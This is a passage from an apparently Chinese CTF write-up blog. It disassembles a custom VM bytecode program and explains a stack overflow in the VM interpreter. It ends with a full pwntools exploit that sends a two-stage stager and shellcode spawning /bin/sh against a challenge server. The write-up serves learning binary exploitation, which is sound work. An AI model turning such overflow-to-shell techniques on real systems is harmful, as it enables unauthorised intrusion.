+00044      | 0e 02 00             | MOV      R2, R0
+00047      | 8d 01                | MOV_SP   R1
+00049      | 0f 00 01 00 00 00    | MOV      R0, 0x1
+0004f      | 7d 02                | PUSH     R2
+00051      | 7d 01                | PUSH     R1
+00053      | 7d 00                | PUSH     R0
+00055      | c0 00 00 8b          | CALL     LOC_000e0 (Rel)
+00059      | c0 00 00 0c          | CALL     LOC_00065 (Rel)
+0005d      | c0 00 00 4c          | CALL     LOC_000a9 (Rel)
+00061      | 94 00 00 08          | ADD_SP   0x8
+00065      | ec 00 00 00          | RET      0x0
+00069      | 90 00 00 06          | SUB_SP   0x6
+0006d      | 8d 00                | MOV_SP   R0
+0006f      | 0f 01 00 00 00 00    | MOV      R1, 0x0
+00075      | 0f 02 18 00 00 00    | MOV      R2, 0x18
+0007b      | 7d 02                | PUSH     R2
+0007d      | 7d 01                | PUSH     R1
+0007f      | 7d 00                | PUSH     R0
+00081      | c0 00 00 88          | CALL     LOC_00109 (Rel)
+00085      | 8d 01                | MOV_SP   R1
+00087      | 0f 00 00 00 00 00    | MOV      R0, 0x0
+0008d      | 0f 02 50 00 00 00    | MOV      R2, 0x50
+00093      | 7d 02                | PUSH     R2
+00095      | 7d 01                | PUSH     R1
+00097      | 7d 00                | PUSH     R0
+00099      | c0 00 00 1e          | CALL     LOC_000b7 (Rel)
+0009d      | 8d 01                | MOV_SP   R1
+0009f      | 7d 01                | PUSH     R1
+000a1      | c0 00 00 a1          | CALL     LOC_00142 (Rel)
+000a5      | 94 00 00 06          | ADD_SP   0x6
+000a9      | ec 00 00 00          | RET      0x0
+000ad      | 0f 00 00 00 00 00    | MOV      R0, 0x0
+000b3      | cc 00 00 3c          | SYS_OPEN 0x3c
+000b7      | ec 00 00 00          | RET      0x0
+000bb      | 7d 05                | PUSH     R5
+000bd      | 8d 05                | MOV_SP   R5
+000bf      | 2b 05 08 00 00 00    | ADD      R5, 0x8
+000c5      | 3a 00 05             | LDD      R0, R5
+000c8      | 2b 05 04 00 00 00    | ADD      R5, 0x4
+000ce      | 3a 01 05             | LDD      R1, R5
+000d1      | 2b 05 04 00 00 00    | ADD      R5, 0x4
+000d7      | 3a 02 05             | LDD      R2, R5
+000da      | d4 00 00 00          | SYS_WRITE 0x0
+000de      | 81 05                | POP      R5
+000e0      | ec 00 00 03          | RET      0x3
+000e4      | 7d 05                | PUSH     R5
+000e6      | 8d 05                | MOV_SP   R5
+000e8      | 2b 05 08 00 00 00    | ADD      R5, 0x8
+000ee      | 3a 00 05             | LDD      R0, R5
+000f1      | 2b 05 04 00 00 00    | ADD      R5, 0x4
+000f7      | 3a 01 05             | LDD      R1, R5
+000fa      | 2b 05 04 00 00 00    | ADD      R5, 0x4
+00100      | 3a 02 05             | LDD      R2, R5
+00103      | d4 00 00 01          | SYS_WRITE 0x1
+00107      | 81 05                | POP      R5
+00109      | ec 00 00 03          | RET      0x3
+0010d      | 7d 05                | PUSH     R5
+0010f      | 8d 05                | MOV_SP   R5
+00111      | 2b 05 08 00 00 00    | ADD      R5, 0x8
+00117      | 3a 00 05             | LDD      R0, R5
+0011a      | 2b 05 04 00 00 00    | ADD      R5, 0x4
+00120      | 3a 01 05             | LDD      R1, R5
+00123      | 2b 05 04 00 00 00    | ADD      R5, 0x4
+00129      | 3a 02 05             | LDD      R2, R5
+0012c      | 0f 03 00 00 00 00    | MOV      R3, 0x0
+00132      | 3e 00 01             | STB      R0, R1
+00135      | 85 00                | INC      R0
+00137      | 85 03                | INC      R3
+00139      | 06 03 02             | CMP      R3, R2
+0013c      | b0 80 00 0e          | JL       LOC_0012e (Rel)
+00140      | 81 05                | POP      R5
+00142      | ec 00 00 03          | RET      0x3
+00146      | 7d 05                | PUSH     R5
+00148      | 8d 05                | MOV_SP   R5
+0014a      | 2b 05 08 00 00 00    | ADD      R5, 0x8
+00150      | 90 00 00 03          | SUB_SP   0x3
+00154      | 8d 01                | MOV_SP   R1
+00156      | 0e 00 01             | MOV      R0, R1
+00159      | 47 00 68 65 6c 6c    | STD      R0, 0x6c6c6568
+0015f      | 2b 00 04 00 00 00    | ADD      R0, 0x4
+00165      | 43 00 6f 20 00 00    | STW      R0, 0x206f
+0016b      | 0f 00 01 00 00 00    | MOV      R0, 0x1
+00171      | 0f 02 06 00 00 00    | MOV      R2, 0x6
+00177      | 7d 02                | PUSH     R2
+00179      | 7d 01                | PUSH     R1
+0017b      | 7d 00                | PUSH     R0
+0017d      | c0 80 00 9d          | CALL     LOC_000e0 (Rel)
+00181      | 3a 01 05             | LDD      R1, R5
+00184      | 7d 01                | PUSH     R1
+00186      | c0 00 00 20          | CALL     LOC_001a6 (Rel)
+0018a      | 0e 02 00             | MOV      R2, R0
+0018d      | 3a 01 05             | LDD      R1, R5
+00190      | 0f 00 01 00 00 00    | MOV      R0, 0x1
+00196      | 7d 02                | PUSH     R2
+00198      | 7d 01                | PUSH     R1
+0019a      | 7d 00                | PUSH     R0
+0019c      | c0 80 00 bc          | CALL     LOC_000e0 (Rel)
+001a0      | 94 00 00 03          | ADD_SP   0x3
+001a4      | 81 05                | POP      R5
+001a6      | ec 00 00 01          | RET      0x1
+001aa      | 7d 05                | PUSH     R5
+001ac      | 8d 05                | MOV_SP   R5
+001ae      | 2b 05 08 00 00 00    | ADD      R5, 0x8
+001b4      | 3a 01 05             | LDD      R1, R5
+001b7      | 0e 00 01             | MOV      R0, R1
+001ba      | 32 02 00             | LDB      R2, R0
+001bd      | 07 02 00 00 00 00    | CMP      R2, 0x0
+001c3      | a8 00 00 06          | JE       LOC_001c9 (Rel)
+001c7      | 85 00                | INC      R0
+001c9      | a4 80 00 13          | JMP      LOC_001b6 (Rel)
+001cd      | 2e 00 01             | SUB      R0, R1
+001d0      | 81 05                | POP      R5
+001d2      | ec 00 00 01          | RET      0x1
+</code></pre><hr>
+<h2 id="漏洞与利用">漏洞与利用</h2>
+<p>我们可以很容易的看到程序存在一个栈溢出漏洞，但是如何利用呢，我们不妨看看这个解释器是如何解释程序栈的</p>
+<pre tabindex="0"><code>case 59:
+      a1-&gt;ip = *(_DWORD *)(a1-&gt;buffer_ptr + a1-&gt;opcode_len);
+      result = (__int64)a1;
+      a1-&gt;opcode_len += 4 * (a2-&gt;operand1 + 1);
+      break;
+</code></pre><p>也就是说，我们可以通过溢出的方式把对应地址的ip修改为我们shellcode的地址即可，但是可怕的事情发生了</p>
+<pre tabindex="0"><code>
+# &#34;nib/&#34; = 0x6e69622f
+
+shellcode += encode_mov(0, 0)  
+shellcode += encode_std(0, 0x6e69622f) 
+
+# &#34;hs//&#34; = 0x68732f2f (Padding with / to make 4 bytes, or just /sh\0)
+# &#34;/sh\0&#34; = 0x0068732f
+
+shellcode += encode_mov(0, 4)             # R0 = 4
+shellcode += encode_std(0, 0x0068732f)
+
+syscall(59, base + R0, R1, R2)
+
+shellcode += encode_mov(1, 0)    
+shellcode += encode_mov(0, 0)             # R1 = 0 (argv)
+shellcode += encode_mov(2, 0)             # R2 = 0 (envp)
+
+shellcode += encode_sys_execve_ptr(59)
+log.info(f&#34;Shellcode length: {len(shellcode)} bytes&#34;)
+log.info(f&#34;Shellcode hex: {shellcode.hex()}&#34;)
+</code></pre><p>经过调试，我们发生溢出的位置<code>0x2ffe0</code>写入shellcode后ip会跳出<code>0x30000</code>从而引起报措，</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">	<span class="nf">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xCuLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span><span class="o">-&gt;</span><span class="n">opcode_len</span> <span class="o">&gt;</span> <span class="mh">0x30000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>因此选择先构造一次<code>read</code>再<code>execve(&quot;/bin/sh&quot;,0,0)</code></p>
+<h2 id="如何调试">如何调试？</h2>
+<p>我想，这个才是最重要的，对于<strong>溢出的控制</strong>我们可以断在<code>loc_1A64</code></p>
+<pre tabindex="0"><code>b *$rebase(0x1a64)
+a1-&gt;ip = *(_DWORD *)(a1-&gt;buffer_ptr + a1-&gt;opcode_len);
+</code></pre><p>对于syscall的调试</p>
+<pre tabindex="0"><code>b *$rebase(0x149d)
+</code></pre><h2 id="最终版">最终版</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gen_int_bytes</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode_mov</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Opcode 3 (MOV Imm): 6 bytes</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0f</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span> <span class="o">+</span> <span class="n">gen_int_bytes</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode_std</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Opcode 17 (STD): 6 bytes</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x47</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span> <span class="o">+</span> <span class="n">gen_int_bytes</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode_add</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Opcode 10 (ADD): 6 bytes</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x2b</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span> <span class="o">+</span> <span class="n">gen_int_bytes</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode_sys_ptr</span><span class="p">(</span><span class="n">syscall_num</span><span class="p">,</span> <span class="n">opcode</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Syscall Wrapper: 4 bytes</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">syscall_num</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Opcode &lt;&lt; 2 | 0 (Type 0)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">op_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">opcode</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">((</span><span class="n">op_byte</span><span class="o">&gt;&gt;</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="mi">36</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p8</span><span class="p">(</span><span class="n">op_byte</span><span class="p">)</span> <span class="o">+</span> <span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode_jmp_reg</span><span class="p">(</span><span class="n">reg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xa5</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stager</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stager</span> <span class="o">+=</span> <span class="n">encode_mov</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stager</span> <span class="o">+=</span> <span class="n">encode_mov</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stager</span> <span class="o">+=</span> <span class="n">encode_mov</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Syscall Read (Opcode 53)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stager</span> <span class="o">+=</span> <span class="n">encode_sys_ptr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">53</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Jump to R1 (0)</span>
+</span></span><span class="line"><span class="cl"><span class="n">stager</span> <span class="o">+=</span> <span class="n">encode_jmp_reg</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Stager Length: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">stager</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes (Max 32)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">real_sc</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">real_sc</span> <span class="o">+=</span> <span class="n">encode_mov</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">real_sc</span> <span class="o">+=</span> <span class="n">encode_mov</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">real_sc</span> <span class="o">+=</span> <span class="n">encode_mov</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">real_sc</span> <span class="o">+=</span> <span class="n">encode_std</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x6e69622f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">real_sc</span> <span class="o">+=</span> <span class="n">encode_add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">real_sc</span> <span class="o">+=</span> <span class="n">encode_std</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x0068732f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">real_sc</span> <span class="o">+=</span> <span class="n">encode_mov</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">real_sc</span> <span class="o">+=</span> <span class="n">encode_sys_ptr</span><span class="p">(</span><span class="mi">59</span><span class="p">,</span> <span class="mi">52</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">25189</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="mh">0x2FFE0</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">24</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload_1</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">stager</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">stager</span><span class="p">)</span><span class="o">+</span><span class="mh">0x2ffe0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;name?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(p,&#34;b *$rebase(0x149d)&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Stage 1 (Stager) Sent!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;hello&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">real_sc</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Stage 2 (Shellcode) Sent!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="../images/das1.png" alt=""></p></article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/toc.js'></script>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/toc.css' />
+
+  
+<div id="gitalk-container" class="gitalk-container"></div>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/gitalk.css'>
+<script src='https://ret2ldz.github.io/js/gitalk.min.js'></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: 'Your client ID',
+    clientSecret: 'Your client secret',
+    repo: 'ret2ldz.github.io',
+    owner: 'ventusoon',
+    admin: ['ventusoon'],
+    id: eval("location.pathname"), 
+    distractionFreeMode: false 
+  });
+  (function() {
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+</div>
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://ret2ldz.github.io/">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
+      
+      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+
+</body>
+
+<script type="application/javascript" src="https://ret2ldz.github.io/js/github-style.js"></script>
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.min.js"></script>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/search.js'></script>
+
+
+
+</html>
